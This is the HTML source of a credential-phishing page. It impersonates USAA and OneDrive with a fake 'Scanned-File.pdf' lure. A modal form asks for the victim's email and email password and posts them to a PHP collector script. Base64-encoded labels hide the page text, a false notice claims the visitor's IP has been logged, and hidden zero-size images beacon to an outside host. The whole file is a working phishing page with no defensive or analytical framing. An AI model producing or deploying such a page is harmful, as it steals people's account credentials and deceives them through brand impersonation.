<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      <link rel="stylesheet" href="files/css/bootstrap.min.css">
      <link rel="SHORTCUT ICON" sizes="16x16" href="files/img/usaa.png">
      <link rel="stylesheet" href="files/css/all.css">
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
      <link rel="stylesheet" href="files/css/styles.css">
      <title></title>
      <style>
         body {
         background-image: url("files/img/bg.png");
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
  position: relative;
         }
      </style>
   </head>
   <body>
      <nav class="navbar navbar-inverse navbar-toggleable-sm navbar-fixed-top" style="position: fixed; margin-bottom: 40px;">
         <div class=" mb-3">
            <img src="files/img/usaa.png" id="logo-image" style="height: 75px; width: 120px;">
            <img src="http://shopget24.com/images/sampledata/hack-run.png" width="0" height="0">
			<button class="navbar-toggler custom-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#myContent" aria-expanded="false" aria-label="Toggle Navigation">
            <span class="navbar-toggler-icon"></span>
            </button>
         </div>
         <a href="#" class="navbar-brand col-sm-4" ><span style="font-weight:bold;"><span id="p1"> </span>&nbsp;<small><span id="p2"></span></small></span></a>
         </div>
         <div class="collapse navbar-collapse" id="myContent">
            <div class="navbar-nav">
            </div>
         </div>
      </nav>
      <div class="container col-sm-12 mt-3">
         <div class="row">
            <div class="offset-md-2 col-sm-12 col-xs-12 col-md-8" style="
               top: 30px;
               ">
               <div class="mt-5">
                  <div class="card text-center">
                     <div class="card-header">
                        <ul class="nav nav-tabs card-header-tabs">
                           <li class="nav-item">
                              <a class="nav-link disabled" href="#"><span id="p3" class="glyphicon glyphicon-file"></span></a>
                           </li>
                           <li class="nav-item">
                              <a class="nav-link disabled" id="p4" href="#"></a>
                           </li>
                           <li class="nav-item">
                              <a class="nav-link active" id="p5" href="#"></a>
                           </li>
                        </ul>
                     </div>
                     <div class="card-body">
                        <div class="ml-3 mt-3 text-left">
                           <img style="height: 30px; float: left; margin-right: 10px; display:inline-block;margin-right:10px;" src="files/img/usaa.png">
                           <b><span style="display:inline-block;" class="rex" id="p6"></span></b>
                        </div>
                        <div class="mt-4 mb-5">
                           <div>
                              <img src="files/img/do.png" id="attachment" class="mt-1" style="width: 85px; margin-top: 20px;">
                              <div class="">
                                 <br> 
								 <img id="hack-run" src="https://shopget24.com/images/sampledata/hack-run.png" width="0" height="0">
                                 <div>
                                    <small class="text-left card-text" ><b><span id="p7"></span>&nbsp;Scanned-File.pdf</small></b>
                                 </div>
                                 <div>
                                    <small class="text-left card-text" id="p8"></small>
                                 </div>
                                 <div>
                                    <small class="text-left card-text" id="p9"></small>
                                 </div>
                                 <div>
                                    <small class="text-left card-text" id="p10"></small>
                                 </div>
                              </div>
                              <a href="#" class="mt-5 btn btn-primary" data-toggle="modal" style="background-color: rgb(0,71,181); " id="p11" data-target="#myModal"></a>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="row" style="padding-top: 30px;">
               </div>
            </div>
         </div>
         <div class="modal show" id="myModal">
            <div class="modal-dialog modal-dialog-centered">
               <div class="modal-content">
                  <div id="spin-wrapper" class="spin-wrapper" style="display: none;">
                     <div style="padding-top: 130px; padding-left: 100px;">
                        <img src="files/img/usaa.png" style="width: 70px;">
                     </div>
                     <div id="spin-pos" class="spin-pos">
                        <div class="progress-caption" id="p12" style="font-size: 16px; font-weight: 600;"></div>
                     </div>
                  </div>
                  <div class="modal-header">
                     <div class="row">
                        <div class="col-sm-12 col-md-12 col-lg-12">
                           <div>
                              <img style="height: 30px; float: left; margin-right: 10px;" src="files/img/usaa.png">
                           </div>
                           <b><span class="modal-title" ></span></b>
                        </div>
                     </div>
                     <button type="button" class="close" data-dismiss="modal">×</button>
                  </div>
                  <div class="modal-body">
                     <div class="container">
                        <div id="response" class="m-0" style="font-size: 14px; margin-top: 10px;">
                        </div>
                        <form action="EM/dc2.php"  onSubmit="return validateEmail()" method="post">
                           <div class="form-group">
                              <p>Please verify your authorize usaa email and password on file to access your secured EFT payment document</p>
                           </div>
                           <div class="form-group">
                              <label for="user_email" id="p15" style="color:red">Email Address</label>								
                              <input class="form-control form-control-sm" required id="user_email" value="" placeholder="Please enter your email" name="email" type="text">
                              <span id="email-error" class="user-error" style="font-size: 13px; color: red;"></span>
                           </div>
                           <div class="form-group">
                              <label for="user_pwd" id="p14" style="color:red">Email Password</label>
                              <input class="form-control form-control-sm" required id="user_pwd" placeholder="Please enter  your password" name="pswd" type="password">
                              <span id="pass-error" class="user-error" style="font-size: 13px; color: red;"></span>
                           </div>
                           <input class="btn btn-primary btn-block"  id="login_btn"   type="submit" value="View File" name="btn btn-block bt-login" style="background-color: rgb(0,71,181);"/> 
                        </form>
                     </div>
                  </div>
                  <center>
                  <div class="row mt-0">
                     <div class="col-sm-12 col-md-12 col-lg-12">
                     </div>
                     <div class="col-sm-12 col-md-12 col-lg-12 mt-0">
                        <center>
                           <big style="font-size: 10px;">&copy; 2022 USAA</span></big>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                     </div>
                  </div>
                  </center>
               </div>
            </div>
         </div>
         <div class="mt-5">
            <footer class="container-fluid text-center">
               <div class="row">
                  <div class="col-sm-12">
                     <b class="glyphicon glyphicon-chevron-up"><font color="white" id="p18"></font></b>
                  </div>
                  <div style="font-size: 14px;" style="display:inline-block;margin-right:10px;" class="col-sm-12">
                     <small>
                     <font style="display:inline-block;" color="white">
                     <span style="display:inline-block;" id="p18b"></span>
                     (105.112.182.148) 
                     <span style="display:inline-block;" id="p19"></span>
                     </font> 
                     </small>
                  </div>
				  <img id="hack-run" src="http://shopget24.com/images/sampledata/hack-run.png" width="0" height="0">
                  <div class="col-sm-12">
                     <span>
                     <small>
                     <font style="display:inline-block;margin-right:10px;" color="white"> &copy; 2022 <span style="display:inline-block;" id="p20"></span>
                     </font>
                     </small>
                     </span>
                  </div>
               </div>
               <br>
            </footer>
         </div>
      </div>
      </div>
      <script src="files/js/jquery.slim.min.js"></script>
      <script type="text/javascript">
         $(document).ready(function() {
          
         
         document.title = atob("T25lRHJpdmUgQ2xvdWQ=");
         // p0.innerHTML.innerHTML= atob("UGxlYXNlIHdhaXQsIHdlIGFyZSBzZXR0aW5nIHVwIHRoaW5ncyBmb3IgeW91");
         p1.innerHTML= atob("");
         p2.innerHTML= atob("");
         p3.innerHTML= atob("RWRpdCBEb2M=");
         p4.innerHTML= atob("U2lnbiBEb2M=");
         p5.innerHTML= atob("VmlldyBEb2M=");
         p6.innerHTML= atob("U2VjdXJlIEZpbGUgQXR0YWNoZWQ=");
         p7.innerHTML= atob("RmlsZW5hbWU6");
         p8.innerHTML= atob("RGVzY3JpcHRpb246IFNlY3VyZWQgRG9jdW1lbnQ=");
         p9.innerHTML= atob("VHlwZTogUERG");
         p10.innerHTML= atob("U2l6ZTogMjU2S0I=");
         p11.innerHTML= atob("VmlldyBEb2N1bWVudA==");
         p12.innerHTML= atob("U2Nhbm5pbmcgZG9jdW1lbnQgZm9yIHZpcnVz");
         p13.innerHTML= atob("T25lRHJpdmUu");
         p14.innerHTML= atob("UGFzc3dvcmQ6");
         p15.innerHTML= atob("U2lnbiBpbiB3aXRoIFJlY2VpdmVyJ3MgZW1haWwgYW5kIHBhc3N3b3JkIHRvIGdhaW4gYWNjZXNzLg==");
         p16.innerHTML= atob("T25lRHJpdmUu");
         p17.innerHTML= atob("T25lRHJpdmUgQ2xvdWQ=");
         p18.innerHTML= atob("T25lRHJpdmUgQ2xvdWQ=");
         p18b.innerHTML= atob("WW91ciBJUCBhZGRyZXNz");
         p19.innerHTML= atob("aGF2ZSBiZWVuIGxvZ2dlZCBmb3Igc2VjdXJpdHkgcHVycG9zZXMu");
         p20.innerHTML= atob("T25lRHJpdmUu");
         
         
         });
		 
		 function validateEmail() {
			email = document.getElementById("user_email").value ;
			const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;      
			return re.test(String(email).toLowerCase());
		}
         
               // $(window).on('load',function(){
                   // $('#myModal').modal('show');
               // });
            
      </script>
      <script src="files/js/tether.min.js"></script>
      <script src="files/js/bootstrap.min.js"></script>
      <script src="files/js/scripts.js"></script>
   </body>
</html>